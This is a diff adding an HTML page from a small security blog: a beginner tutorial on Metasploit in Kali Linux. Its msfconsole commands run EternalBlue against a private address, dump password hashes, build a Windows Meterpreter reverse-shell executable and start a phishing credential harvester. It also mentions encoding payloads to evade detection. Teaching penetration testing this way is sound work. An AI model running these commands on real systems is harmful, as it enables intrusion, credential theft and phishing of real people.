@@ -1,0 +1,187 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title>Metasploit basics for pentester</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<a href="index.html" class="logo">CYBER30</a>
+					</header>
+
+				<!-- Nav -->
+					<nav id="nav">
+						<ul class="icons">
+							<li><a href="https://twitter.com/cyberthirty30" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+							<li><a href="https://www.linkedin.com/in/cyber30/" class="icon brands fa-linkedin"><span class="label">Instagram</span></a></li>
+							<li><a href="https://github.com/cyberthirty/" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+							<l><a href="tel:+265886559797" class="icon brands fa-whatsapp"><span class="label">Whatsapp</span></a></l>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+
+						<!-- Post -->
+							<section class="post">
+								<header class="major">
+									<h1>Metaspliot Basics</h1>
+								</header>
+								<img src="images/0 ym2lPV6ho8awD1h1.png" class="stepimg" alt="" />
+							
+								<!-- Text stuff -->
+									<h2>Introduction</h2>
+									<p>Metasploit is an open-source penetration testing framework that helps security professionals and hackers identify and exploit vulnerabilities in computer systems. It provides a comprehensive set of tools for penetration testing, ethical hacking, and security research. Metasploit is widely used in the cybersecurity community for testing and securing systems.</p>
+									<h3>Key features of Metasploit include</h3>	
+							
+	(1) Exploitation:  Metasploit allows users to exploit vulnerabilities in target systems. It provides a vast collection of pre-built exploits for a wide range of software and operating systems.<br />
+	(2) Payloads: Metasploit supports various payloads, which are pieces of code that can be executed on a target system after a successful exploit. Payloads can be used for tasks such as remote command execution, shell creation, or data extraction.<br />
+	(3) Post-Exploitation Modules: Once a system is compromised, Metasploit offers post-exploitation modules for tasks like privilege escalation, lateral movement, and data exfiltration.<br />
+	(4) Auxiliary Modules: These modules perform various tasks that support the penetration testing process, such as scanning, fingerprinting, and information gathering.<br />
+	(5) Meterpreter: A powerful, dynamic payload that provides a wide range of post-exploitation capabilities, including file system manipulation, keylogging, and network exploration.<br />
+	(6) MSFConsole: The command-line interface for interacting with Metasploit. It allows users to configure and launch exploits, payloads, and modules.<br />
+	(7) MSFweb and Armitage: Web-based and graphical user interfaces for Metasploit, respectively, providing an easier way to interact with the framework.<br />
+
+	<br />
+									<P>Metasploit has multiple interfaces including;<br />
+	(1) msfconsole - an interactive command-line like interface<br />
+	(2) msfcli - a literal Linux command line interface<br />
+	(3) Armitage - a GUI-based third party application<br />
+	(4) msfweb - browser based interface</P>
+
+						<h3>Step 1: Setting Up Metasploit </h3>
+						<p>Ensure you have Kali Linux installed, as Metasploit comes preloaded. Before we start Metasploit, it’s good idea to start the postgresql database. Open the terminal and  run <code class="codeback">sudo service enable postgresql</code> to automatically start up, everytime we fire up our hacking machine. This enables
+	Metasploit to store data in the familiar relational database model. This enables easy and seamless access
+	to your data. Metasploit will work without postgresql, but this database enables Metasploit to run faster
+	searches and store the information we collect while scanning and exploiting.
+	</p>
+						<pre><code class="codeback">
+cyber30@kali$ sudo service enable postgresql
+[sudo] password for cyber30:
+						</code></pre>
+						<p>launch Metasploit by typing <code class="codeback">'msfconsole.'</code> Below is a screenshot of the Metasploit console.</p>
+						<pre><code class="codeback">	
+cyber30@kali$ msfconsole
+						</code></pre>
+
+
+						<h3>Step 2: Understanding Modules </h3>
+						<p>Metasploit operates using modules, each designed for specific tasks. For example, use the 'search' command to discover available modules, and 'use' to select the one suitable for your objectives.</p>
+						<pre><code class="codeback">
+msf >search 
+msf >search type:auxiliary tcp
+msf >search type:auxiliary eternalblue
+msf >search type:exploit platform:windows eternalblue
+						</code></pre>
+
+
+						<h3>Step 3: Target Selection and Scanning</h3>
+						<p>Identify your target system and perform a thorough reconnaissance using Metasploit's scanning modules, such as 'nmap.' Below is a sample command for network scanning.
+						</p>
+						<pre><code class="codeback">
+msf > use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) > set RHOSTS 192.168.1.1
+msf auxiliary(tcp) > run
+						</pre></code>
+
+
+						<h3>Step 4: Exploitation</h3>
+						<p>Exploit vulnerabilities using Metasploit's exploit modules. Set payloads and execute exploits against your target. Here's an example using the EternalBlue exploit.</p>
+						<pre><code class="codeback">
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.2
+msf exploit(ms17_010_eternalblue) > run
+						</code></pre>
+
+
+						<h3>Step 5: Post-Exploitation</h3>
+						<P>Explore the post-exploitation phase using Metasploit's post modules. Gain insights into maintaining access, privilege escalation, and extracting valuable information. For instance, use the 'hashdump' module to retrieve password hashes.</P>
+						<pre><code class="codeback">
+msf exploit(ms17_010_eternalblue) > use post/windows/gather/hashdump
+msf post(hashdump) > run
+						</code></pre>
+
+
+						<h3>Step 6: Creating Custom Payloads</h3>
+						<p>Enhance your skills by creating custom payloads tailored to specific scenarios. Understand how to encode payloads to evade detection. Below is an example of creating a simple Windows Meterpreter payload.</p>
+						<pre><code class="codeback">
+msf > use payload/windows/meterpreter/reverse_tcp
+msf payload(reverse_tcp) > set LHOST 10.0.9.5
+msf payload(reverse_tcp) > set LPORT 4444
+msf payload(reverse_tcp) > generate -f exe -o custom_payload.exe
+						</code></pre>
+
+						
+						<h3>step 7: Integrating Custom Scripts into Metasploit</h3>
+						<p>Customize Metasploit by integrating your scripts. For example, create a Metasploit resource script to automate the process of setting up a phishing campaign.</p>
+<pre><code class="codeback">						
+cyber30@kali$ nano phishing.rc
+</pre></code>
+
+Insert the following:
+<pre><code class="codeback">
+use auxiliary/server/phishing_credential_harvester
+set SRVPORT 80
+set URIPATH /
+run
+</pre></code>
+
+Launch Metasploit with the resource script:
+
+<pre><code class="codeback">
+cyber30@kali$ msfconsole -r phishing.rc
+</pre></code>
+
+						<h3>Step 8: Meterpreter Basics</h3>
+						<p>We can get deeper into the Meterpreter, an advanced, dynamic payload in Metasploit. Interact with the compromised system, execute commands, and explore its functionalities for comprehensive post-exploitation.
+						</p>
+						<h2>Conclusion</h2>
+						<p>Congratulations! You've better understand of Metasploit basice by using Kali Linux we've successfully installed . Now you is now ready for exploiting and hacking Machine like Tioprix and more . 
+						</p>
+								
+
+							</section>
+
+					</div>
+
+				<!-- Footer -->
+					<footer id="footer">
+						<section class="split contact">
+							<section>
+								<h3>Social</h3>
+								<ul class="icons alt">
+									<li><a href="https://twitter.com/cyberthirty30" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+									<li><a href="https://www.linkedin.com/in/cyber30/" class="icon brands fa-linkedin"><span class="label">Instagram</span></a></li>
+									<li><a href="https://github.com/cyberthirty/" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+								</ul>
+							</section>
+						</section>
+					</footer>
+
+				<!-- Copyright -->
+					<div id="copyright">
+						<ul><li>&copy; 2023 <a href="https://github.com/cyberthirty/">CYBER30 Inc</a></li></ul>
+					</div>
+
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
